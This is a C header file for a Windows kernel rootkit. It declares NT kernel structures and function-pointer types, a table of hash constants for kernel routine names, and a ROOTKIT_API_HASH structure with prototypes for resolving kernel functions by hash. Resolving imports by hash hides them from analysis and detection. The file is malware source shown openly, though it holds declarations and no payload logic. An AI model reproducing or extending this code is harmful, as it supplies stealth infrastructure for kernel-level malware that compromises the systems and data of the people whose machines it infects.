#pragma once


#define RtlOffsetToPointer(Module,Pointer)((PUCHAR)(PUCHAR)Module+(ULONG)Pointer)


/*/////////////////////////////////////////

FUNCTION DEFINITIONS

*//////////////////////////////////////////

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation = 0,
	SystemProcessorInformation = 1,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemPathInformation = 4,
	SystemProcessInformation = 5,
	SystemCallCountInformation = 6,
	SystemDeviceInformation = 7,
	SystemProcessorPerformanceInformation = 8,
	SystemFlagsInformation = 9,
	SystemCallTimeInformation = 10,
	SystemModuleInformation = 11,
	SystemLocksInformation = 12,
	SystemStackTraceInformation = 13,
	SystemPagedPoolInformation = 14,
	SystemNonPagedPoolInformation = 15,
	SystemHandleInformation = 16,
	SystemObjectInformation = 17,
	SystemPageFileInformation = 18,
	SystemVdmInstemulInformation = 19,
	SystemVdmBopInformation = 20,
	SystemFileCacheInformation = 21,
	SystemPoolTagInformation = 22,
	SystemInterruptInformation = 23,
	SystemDpcBehaviorInformation = 24,
	SystemFullMemoryInformation = 25,
	SystemLoadGdiDriverInformation = 26,
	SystemUnloadGdiDriverInformation = 27,
	SystemTimeAdjustmentInformation = 28,
	SystemSummaryMemoryInformation = 29,
	SystemMirrorMemoryInformation = 30,
	SystemPerformanceTraceInformation = 31,
	SystemObsolete0 = 32,
	SystemExceptionInformation = 33,
	SystemCrashDumpStateInformation = 34,
	SystemKernelDebuggerInformation = 35,
	SystemContextSwitchInformation = 36,
	SystemRegistryQuotaInformation = 37,
	SystemExtendServiceTableInformation = 38,
	SystemPrioritySeperation = 39,
	SystemVerifierAddDriverInformation = 40,
	SystemVerifierRemoveDriverInformation = 41,
	SystemProcessorIdleInformation = 42,
	SystemLegacyDriverInformation = 43,
	SystemCurrentTimeZoneInformation = 44,
	SystemLookasideInformation = 45,
	SystemTimeSlipNotification = 46,
	SystemSessionCreate = 47,
	SystemSessionDetach = 48,
	SystemSessionInformation = 49,
	SystemRangeStartInformation = 50,
	SystemVerifierInformation = 51,
	SystemVerifierThunkExtend = 52,
	SystemSessionProcessInformation = 53,
	SystemLoadGdiDriverInSystemSpace = 54,
	SystemNumaProcessorMap = 55,
	SystemPrefetcherInformation = 56,
	SystemExtendedProcessInformation = 57,
	SystemRecommendedSharedDataAlignment = 58,
	SystemComPlusPackage = 59,
	SystemNumaAvailableMemory = 60,
	SystemProcessorPowerInformation = 61,
	SystemEmulationBasicInformation = 62,
	SystemEmulationProcessorInformation = 63,
	SystemExtendedHandleInformation = 64,
	SystemLostDelayedWriteInformation = 65,
	SystemBigPoolInformation = 66,
	SystemSessionPoolTagInformation = 67,
	SystemSessionMappedViewInformation = 68,
	SystemHotpatchInformation = 69,
	SystemObjectSecurityMode = 70,
	SystemWatchdogTimerHandler = 71,
	SystemWatchdogTimerInformation = 72,
	SystemLogicalProcessorInformation = 73,
	SystemWow64SharedInformation = 74,
	SystemRegisterFirmwareTableInformationHandler = 75,
	SystemFirmwareTableInformation = 76,
	SystemModuleInformationEx = 77,
	SystemVerifierTriageInformation = 78,
	SystemSuperfetchInformation = 79,
	SystemMemoryListInformation = 80,
	SystemFileCacheInformationEx = 81,
	MaxSystemInfoClass = 82

} SYSTEM_INFORMATION_CLASS;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


typedef NTKERNELAPI PEPROCESS(*fnIoGetCurrentProcess)(

	);

typedef PVOID(__stdcall *fnMmAllocateMappingAddress)(
	SIZE_T NumberOfBytes,
	ULONG  PoolTag
	);

typedef VOID(__stdcall *fnMmFreeMappingAddress)(
	PVOID BaseAddress,
	ULONG PoolTag
	);

typedef NTSTATUS(__stdcall *fnObReferenceObjectByHandle)(
	HANDLE                     Handle,
	ACCESS_MASK                DesiredAccess,
	POBJECT_TYPE               ObjectType,
	KPROCESSOR_MODE            AccessMode,
	PVOID                      *Object,
	POBJECT_HANDLE_INFORMATION HandleInformation
	);

typedef LONG_PTR(__fastcall *fnObfDereferenceObject)(
	PVOID Object);

typedef NTSTATUS(__stdcall *fnObOpenObjectByPointer)(
	PVOID           Object,
	ULONG           HandleAttributes,
	PACCESS_STATE   PassedAccessState,
	ACCESS_MASK     DesiredAccess,
	POBJECT_TYPE    ObjectType,
	KPROCESSOR_MODE AccessMode,
	PHANDLE         Handle
	);

typedef NTSTATUS(__stdcall *fnPsCreateSystemThread)(
	PHANDLE            ThreadHandle,
	ULONG              DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE             ProcessHandle,
	PCLIENT_ID         ClientId,
	PKSTART_ROUTINE    StartRoutine,
	PVOID              StartContext
	);

typedef NTSTATUS(__stdcall *fnPsLookupProcessByProcessId)(
	HANDLE    ProcessId,
	PEPROCESS *Process
	);

typedef KIRQL(__fastcall *fnKfAcquireSpinLock)(PKSPIN_LOCK SpinLock);
typedef VOID(__fastcall *fnKfReleaseSpinLock)(PKSPIN_LOCK SpinLock, KIRQL NewIrql);

typedef VOID(__stdcall *fnKeInitializeEvent)(PRKEVENT Object, EVENT_TYPE EventType, BOOLEAN State);

typedef NTSTATUS(__fastcall *fnIofCallDriver)(PDEVICE_OBJECT DeviceObject, PIRP Irp);

typedef VOID(__stdcall *fnIoFreeMdl)(PMDL Mdl);
typedef VOID(__stdcall *fnIoFreeIrp)(PIRP Irp);

typedef  PMDL(__stdcall *fnIoAllocateMdl)(
	__drv_aliasesMem PVOID VirtualAddress,
	ULONG                  Length,
	BOOLEAN                SecondaryBuffer,
	BOOLEAN                ChargeQuota,
	PIRP                   Irp
	);

typedef NTSTATUS(*fnKeWaitForSingleObject)(
	PVOID                                                                         Object,
	_Strict_type_match_ KWAIT_REASON                                              WaitReason,
	__drv_strictType(KPROCESSOR_MODE / enum _MODE, __drv_typeConst)KPROCESSOR_MODE WaitMode,
	BOOLEAN                                                                       Alertable,
	PLARGE_INTEGER                                                                Timeout
	);

typedef LONG(_stdcall *fnKeSetEvent)(
	PRKEVENT  Event,
	KPRIORITY Increment,
	BOOLEAN   Wait
	);

typedef BOOLEAN(__stdcall *fnMmIsAddressValid)(PVOID VirtualAddress);
typedef  PMDL(*fnMmAllocatePagesForMdlEx)(
	PHYSICAL_ADDRESS    LowAddress,
	PHYSICAL_ADDRESS    HighAddress,
	PHYSICAL_ADDRESS    SkipBytes,
	SIZE_T              TotalBytes,
	MEMORY_CACHING_TYPE CacheType,
	ULONG               Flags
	);
typedef VOID(*fnMmFreePagesFromMdl)(
	PMDL MemoryDescriptorList
	);
typedef PVOID(*fnMmMapLockedPagesWithReservedMapping)(
	PVOID                                                    MappingAddress,
	ULONG                                                    PoolTag,
	PMDL                                                     MemoryDescriptorList,
	__drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE CacheType
	);
typedef  VOID(*fnMmUnmapReservedMapping)(
	PVOID BaseAddress,
	ULONG PoolTag,
	PMDL  MemoryDescriptorList
	);

typedef PVOID(__stdcall *fnExAllocatePool)(
	__drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
	SIZE_T                                         NumberOfBytes
	);

typedef PVOID(__stdcall *fnExAllocatePoolWithTag)(
	__drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
	SIZE_T                                         NumberOfBytes,
	ULONG                                          Tag
	);

typedef  VOID(__stdcall *fnExFreePoolWithTag)(
	__drv_freesMem(Mem)PVOID P,
	ULONG                    Tag
	);
typedef NTSYSAPI VOID(*fnRtlInitUnicodeString)(
	PUNICODE_STRING         DestinationString,
	__drv_aliasesMem PCWSTR SourceString
	);
typedef NTKERNELAPI VOID(*fnKeClearEvent)(
	PRKEVENT Event
	);
typedef NTKERNELAPI LONG(*fnKeResetEvent)(
	PRKEVENT Event
	);
typedef NTKERNELAPI PDEVICE_OBJECT(*fnIoGetRelatedDeviceObject)(
	PFILE_OBJECT FileObject
	);
typedef NTKERNELAPI PIRP(*fnIoAllocateIrp)(
	CCHAR   StackSize,
	BOOLEAN ChargeQuota
	);
typedef NTKERNELAPI BOOLEAN(*fnPsGetVersion)(
	PULONG          MajorVersion,
	PULONG          MinorVersion,
	PULONG          BuildNumber,
	PUNICODE_STRING CSDVersion
	);
typedef NTKERNELAPI NTSTATUS(*fnPsTerminateSystemThread)(
	NTSTATUS ExitStatus
	);

typedef NTKERNELAPI NTSTATUS(*fnIoCreateFileEx)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	PLARGE_INTEGER     AllocationSize,
	ULONG              FileAttributes,
	ULONG              ShareAccess,
	ULONG              Disposition,
	ULONG              CreateOptions,
	PVOID              EaBuffer,
	ULONG              EaLength,
	CREATE_FILE_TYPE   CreateFileType,
	PVOID              InternalParameters,
	ULONG              Options,
	PIO_DRIVER_CREATE_CONTEXT DriverContext
	);
typedef NTKERNELAPI BOOLEAN(*fnExAcquireRundownProtection)(
	PEX_RUNDOWN_REF RunRef
	);
typedef NTKERNELAPI VOID(*fnExReleaseRundownProtection)(
	PEX_RUNDOWN_REF RunRef
	);
typedef NTKERNELAPI VOID(*fnKeStackAttachProcess)(
	PRKPROCESS   PROCESS,
	PRKAPC_STATE ApcState
	);
typedef NTKERNELAPI VOID(*fnKeUnstackDetachProcess)(
	PRKAPC_STATE ApcState
	);
typedef NTKERNELAPI VOID(*fnMmProbeAndLockPages)(
	PMDL            MemoryDescriptorList,
	KPROCESSOR_MODE AccessMode,
	LOCK_OPERATION  Operation
	);
typedef NTKERNELAPI VOID(*fnMmUnlockPages)(
	PMDL MemoryDescriptorList
	);
typedef NTKERNELAPI PVOID(*fnMmMapLockedPagesSpecifyCache)(
	PMDL                                                                          MemoryDescriptorList,
	__drv_strictType(KPROCESSOR_MODE / enum _MODE, __drv_typeConst)KPROCESSOR_MODE AccessMode,
	__drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE                      CacheType,
	PVOID                                                                         RequestedAddress,
	ULONG                                                                         BugCheckOnFailure,
	ULONG                                                                         Priority
	);
typedef NTKERNELAPI VOID(*fnMmUnmapLockedPages)(
	PVOID BaseAddress,
	PMDL  MemoryDescriptorList
	);
typedef NTSYSAPI VOID(*fnRtlInitAnsiString)(
	PANSI_STRING          DestinationString,
	__drv_aliasesMem PCSZ SourceString
	);
typedef KIRQL(__fastcall *fnKfRaiseIrql)(KIRQL NewIrql);
typedef VOID(__fastcall *fnKeReleaseInStackQueuedSpinLock)(PKLOCK_QUEUE_HANDLE LockHandle);
typedef NTKERNELAPI ULONGLONG(*fnKeQueryInterruptTime)(

	);
typedef NTKERNELAPI KAFFINITY(*fnKeQueryActiveProcessors)(

	);
typedef NTKERNELAPI ULONG(*fnKeQueryMaximumProcessorCount)(

	);
typedef NTKERNELAPI ULONG(*fnKeQueryActiveProcessorCount)(
	PKAFFINITY ActiveProcessors
	);
typedef NTKERNELAPI USHORT(*fnKeQueryActiveGroupCount)(

	);
typedef NTKERNELAPI PCONFIGURATION_INFORMATION(*fnIoGetConfigurationInformation)(

	);
typedef NTKERNELAPI HANDLE(NTAPI *fnPsGetThreadId)(_In_ PETHREAD Thread);
typedef VOID(__stdcall *fnRtlTimeToTimeFields)(PLARGE_INTEGER Time, PTIME_FIELDS TimeFields);
typedef BOOLEAN(__stdcall *fnPsIsProtectedProcess)(IN PEPROCESS Process);
typedef VOID(__fastcall *fnKeAcquireGuardedMutex)(PKGUARDED_MUTEX Mutex);
typedef VOID(__fastcall *fnKeReleaseGuardedMutex)(PKGUARDED_MUTEX Mutex);

typedef NTSYSAPI NTSTATUS (*fnZwQueryVolumeInformationFile)(
	HANDLE               FileHandle,
	PIO_STATUS_BLOCK     IoStatusBlock,
	PVOID                FsInformation,
	ULONG                Length,
	FS_INFORMATION_CLASS FsInformationClass
	);
typedef VOID(__fastcall *fnKeInitializeGuardedMutex)(PKGUARDED_MUTEX Mutex);

typedef NTKERNELAPI PIRP (*fnIoBuildDeviceIoControlRequest)(
	ULONG            IoControlCode,
	PDEVICE_OBJECT   DeviceObject,
	PVOID            InputBuffer,
	ULONG            InputBufferLength,
	PVOID            OutputBuffer,
	ULONG            OutputBufferLength,
	BOOLEAN          InternalDeviceIoControl,
	PKEVENT          Event,
	PIO_STATUS_BLOCK IoStatusBlock
	);

typedef NTSTATUS (*fnZwQueryDefaultLocale)(BOOLEAN UserProfile, PLCID LocaleId);
typedef NTSTATUS (*fnZwQueryDefaultUILanguage)(LANGID *Lang);

typedef BOOLEAN(*fnMmIsThisAnNtAsSystem)();
typedef  NTSTATUS (*fnZwOpenFile)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	ULONG              ShareAccess,
	ULONG              OpenOptions
	);
typedef ULONG(*fnRtlRandomEx)(PULONG Seed);
typedef NTSTATUS(*fnRtlAnsiStringToUnicodeString)(PUNICODE_STRING Dest, PCANSI_STRING Src, BOOLEAN Allocate);
typedef PKTHREAD(*fnKeGetCurrentThread)();
typedef NTSTATUS(*fnZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS infoclass, PVOID Buffer, ULONG Size, PULONG ReturnedSize);
typedef int(*fnsprintf_s)(char *buf, size_t sizeinbytes, const char *format, ...);
typedef VOID(*fnMmBuildMdlForNonPagedPool)(PMDL MemoryDescriptorList);
typedef VOID(*fnRtlFreeUnicodeString)(PUNICODE_STRING String);
typedef int(*fnstrlen)(const char *Str);
typedef int(*fnstrcat)(char *buffer, const char *src);
typedef PVOID(*fnMmGetSystemRoutineAddress)(PUNICODE_STRING FunctionName);
typedef NTSTATUS(*fnZwOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef errno_t(*fnstrcpy_s)(char *dst, size_t bytes, const char *buffer);
typedef POBJECT_TYPE(*fnIoFileObjectType);
typedef POBJECT_TYPE(*fnPsProcessType);
typedef PVOID(*fnmemset)(void *dst, int val, size_t size);
typedef NTSTATUS(*fnIoAttachDevice)(PDEVICE_OBJECT, PUNICODE_STRING, PDEVICE_OBJECT*);
typedef NTKERNELAPI NTSTATUS (*fnIoCreateDevice)(
	PDRIVER_OBJECT  DriverObject,
	ULONG           DeviceExtensionSize,
	PUNICODE_STRING DeviceName,
	DEVICE_TYPE     DeviceType,
	ULONG           DeviceCharacteristics,
	BOOLEAN         Exclusive,
	PDEVICE_OBJECT  *DeviceObject
	);


/*/////////////////////////////////

HASH DEFINES

*//////////////////////////////////

#define HASH_MmAllocateMappingAddress				1213418072
#define HASH_MmFreeMappingAddress					1106241737
#define HASH_ObReferenceObjectByHandle				472252492
#define HASH_ObfDereferenceObject					461050410
#define HASH_ObOpenObjectByPointer					1180803250
#define HASH_PsCreateSystemThread					1142346071
#define HASH_PsLookupProcessByProcessId				419886195
#define HASH_KfAcquireSpinLock						1506519338
#define HASH_KeInitializeEvent						895352081
#define HASH_KfReleaseSpinLock						607828400
#define HASH_IofCallDriver							903562787
#define HASH_IoFreeMdl								1692872068
#define HASH_IoFreeIrp								1692804035
#define HASH_IoAllocateMdl							1461398922
#define HASH_KeWaitForSingleObject					954799474
#define HASH_KeSetEvent								794292430
#define HASH_MmIsAddressValid						337116335
#define HASH_MmAllocatePagesForMdlEx				2059618752
#define HASH_MmFreePagesFromMdl						1948951855
#define HASH_MmMapLockedPagesWithReservedMapping	2129247600
#define HASH_MmUnmapReservedMapping					1068506934

#define HASH_ExAllocatePool							1219627488
#define HASH_ExFreePool								1055624354
#define HASH_ExAllocatePoolWithTag					1009512247
#define HASH_ExFreePoolWithTag						1642355224
#define HASH_IoCreateFileEx							1110713386
#define HASH_RtlInitUnicodeString					1223804153
#define HASH_KeClearEvent							1236809865
#define HASH_KeResetEvent							1340201409	
#define HASH_IoGetRelatedDeviceObject				1007102757
#define HASH_IoAllocateIrp							1461330893
#define HASH_PsGetVersion							1699403389
#define HASH_PsTerminateSystemThread				1861091826
#define HASH_IoGetCurrentProcess					964097356
#define HASH_ExAcquireRundownProtection				1154214872
#define HASH_ExReleaseRundownProtection				929856264
#define HASH_KeStackAttachProcess					1139080544
#define HASH_KeUnstackDetachProcess					1926872120
#define HASH_MmProbeAndLockPages					161101065
#define HASH_MmUnlockPages							1081203303
#define HASH_MmMapLockedPagesSpecifyCache			1125389206
#define HASH_MmUnmapLockedPages						1012509085
#define HASH_RtlInitAnsiString						1492213154
#define HASH_KfRaiseIrql							331667929
#define HASH_KeReleaseInStackQueuedSpinLock			1077953492

#define HASH_KeQueryInterruptTime					815035384
#define HASH_KeQueryActiveProcessors				235976875
#define HASH_KeQueryActiveProcessorCount			534536790
#define HASH_KeQueryMaximumProcessorCount			1183188174
#define HASH_KeQueryActiveGroupCount				2091442253
#define HASH_IoGetConfigurationInformation			814160480
#define HASH_PsGetThreadId							1650960545
#define HASH_RtlTimeToTimeFields					437861212
#define HASH_PsIsProtectedProcess					19281260
#define HASH_KeAcquireGuardedMutex					1572662006
#define HASH_KeReleaseGuardedMutex					228117182
#define HASH_ZwQueryVolumeInformationFile			1727823107
#define HASH_KeInitializeGuardedMutex				2144380432
#define HASH_IoBuildDeviceIoControlRequest			736007718
#define HASH_ZwQueryDefaultUILanguage				916593839
#define HASH_ZwQueryDefaultLocale					1949966376
#define HASH_MmIsThisNtAsSystem						348537402
#define HASH_ZwOpenFile								905486999
#define HASH_RtlRandomEx							1894552587
#define HASH_RtlAnsiStringToUnicodeString			2112953346
#define HASH_KeGetCurrentThread						1596576560
#define HASH_ZwQuerySystemInformation				1105445504
#define HASH_sprintf_s								246844882
#define HASH_MmBuildMdlForNonPagedPool				1944274661
#define HASH_RtlFreeUnicodeString					198256711
#define HASH_strlen									76538140
#define HASH_strcat									76298455
#define HASH_MmGetSystemRoutineAddress				1440332469
#define HASH_ZwOpenProcess							298048128
#define HASH_strcpy_s								818035844
#define HASH_PsProcessType							1421882099
#define HASH_IoFileObjectType						748953829
#define HASH_memset									663087746
#define HASH_IoAttachDevice							668877086
#define HASH_IoCreateDevice							994908832



typedef struct _ROOTKIT_API_HASH
{
	PVOID ntoskrnlexe;
	PVOID HalDll;

	// Rtl

	fnRtlInitUnicodeString _RtlInitUnicodeString;
	fnRtlInitAnsiString	_RtlInitAnsiString;
	fnRtlTimeToTimeFields	_RtlTimeToTimeFields;
	fnRtlRandomEx	_RtlRandomEx;
	fnRtlAnsiStringToUnicodeString	_RtlAnsiStringToUnicodeString;
	fnRtlFreeUnicodeString	_RtlFreeUnicodeString;
	// Mm

	fnMmAllocateMappingAddress _MmAllocateMappingAddress;
	fnMmFreeMappingAddress _MmFreeMappingAddress;
	fnMmIsAddressValid _MmIsAddressValid;
	fnMmAllocatePagesForMdlEx _MmAllocatePagesForMdlEx;
	fnMmFreePagesFromMdl _MmFreePagesFromMdl;
	fnMmMapLockedPagesWithReservedMapping _MmMapLockedPagesWithReservedMapping;
	fnMmUnmapReservedMapping _MmUnmapReservedMapping;
	fnMmProbeAndLockPages	_MmProbeAndLockPages;
	fnMmUnlockPages	_MmUnlockPages;
	fnMmMapLockedPagesSpecifyCache	_MmMapLockedPagesSpecifyCache;
	fnMmUnmapLockedPages	_MmUnmapLockedPages;
	fnMmIsThisAnNtAsSystem	_MmIsThisAnNtAsSystem;
	fnMmBuildMdlForNonPagedPool	_MmBuildMdlForNonPagedPool;
	fnMmGetSystemRoutineAddress	_MmGetSystemRoutineAddress;
	// Ob

	fnObReferenceObjectByHandle _ObReferenceObjectByHandle;
	fnObfDereferenceObject _ObfDereferenceObject;
	fnObOpenObjectByPointer _ObOpenObjectByPointer;


	// Io

	fnIofCallDriver _IofCallDriver;
	fnIoFreeIrp _IoFreeIrp;
	fnIoFreeMdl _IoFreeMdl;
	fnIoAllocateMdl _IoAllocateMdl;
	fnIoGetRelatedDeviceObject	_IoGetRelatedDeviceObject;
	fnIoAllocateIrp	_IoAllocateIrp;
	fnIoCreateFileEx	_IoCreateFileEx;
	fnIoGetCurrentProcess	_IoGetCurrentProcess;
	fnIoGetConfigurationInformation	_IoGetConfigurationInformation;
	fnIoBuildDeviceIoControlRequest	_IoBuildDeviceIoControlRequest;
	fnIoFileObjectType	_IoFileObjectType;
	fnIoAttachDevice	_IoAttachDevice;
	fnIoCreateDevice	_IoCreateDevice;

	// Ps

	fnPsCreateSystemThread _PsCreateSystemThread;
	fnPsLookupProcessByProcessId _PsLookupProcessByProcessId;
	fnPsGetVersion	_PsGetVersion;
	fnPsTerminateSystemThread	_PsTerminateSystemThread;
	fnPsGetThreadId	_PsGetThreadId;
	fnPsIsProtectedProcess	_PsIsProtectedProcess;
	fnPsProcessType	_PsProcessType;

	// Ex

	fnExAllocatePool _ExAllocatePool;
	fnExAllocatePoolWithTag _ExAllocatePoolWithTag;
	fnExFreePoolWithTag _ExFreePoolWithTag;
	fnExAcquireRundownProtection	_ExAcquireRundownProtection;
	fnExReleaseRundownProtection	_ExReleaseRundownProtection;

	// Kz & Ke


	fnKeInitializeEvent _KeInitializeEvent;
	fnKeWaitForSingleObject _KeWaitForSingleObject;
	fnKeSetEvent _KeSetEvent;
	fnKeResetEvent	_KeResetEvent;
	fnKeClearEvent	_KeClearEvent;
	fnKeStackAttachProcess	_KeStackAttachProcess;
	fnKeUnstackDetachProcess	_KeUnstackDetachProcess;
	fnKeReleaseInStackQueuedSpinLock	_KeReleaseInStackQueuedSpinLock;
	fnKeQueryInterruptTime	_KeQueryInterruptTime;
	fnKeQueryActiveGroupCount	_KeQueryActiveGroupCount;
	fnKeQueryActiveProcessorCount	_KeQueryActiveProcessorCount;
	fnKeQueryActiveProcessors	_KeQueryActiveProcessors;
	fnKeQueryMaximumProcessorCount	_KeQueryMaximumProcessorCount;
	fnKeAcquireGuardedMutex	_KeAcquireGuardedMutex;
	fnKeReleaseGuardedMutex	_KeReleaseGuardedMutex;
	fnKeInitializeGuardedMutex	_KeInitializeGuardedMutex;
	fnKeGetCurrentThread	_KeGetCurrentThread;

	// Kf -> Hal.dll

	fnKfAcquireSpinLock _KfAcquireSpinLock;
	fnKfReleaseSpinLock _KfReleaseSpinLock;
	fnKfRaiseIrql	_KfRaiseIrql;

	// Se


	// Other

	fnZwQueryVolumeInformationFile	_ZwQueryVolumeInformationFile;
	fnZwQueryDefaultLocale	_ZwQueryDefaultLocale;
	fnZwQueryDefaultUILanguage	_ZwQueryDefaultUILanguage;
	fnZwOpenFile	_ZwOpenFile;
	fnZwQuerySystemInformation	_ZwQuerySystemInformation;
	fnsprintf_s	_sprintf_s;
	fnstrcat	_strcat;
	fnstrlen	_strlen;
	fnstrcpy_s	_strcpy_s;
	fnZwOpenProcess	_ZwOpenProcess;
	fnmemset	_memset;

}ROOTKIT_API_HASH, *PROOTKIT_API_HASH;


VOID KiLoadFunctions(PROOTKIT_API_HASH Hash);
PVOID KiGetProcAddress(IN PVOID ModuleBase, IN ULONG Hash, IN ULONG Data);
PVOID KiResolveAddress(IN PVOID ModuleBase, IN ULONG Hash);
PVOID KiGetModuleHandle(IN PWCHAR ModuleName);
UINT32 KiCryptoHash(IN PCHAR Input);

extern ROOTKIT_API_HASH g_Hash;



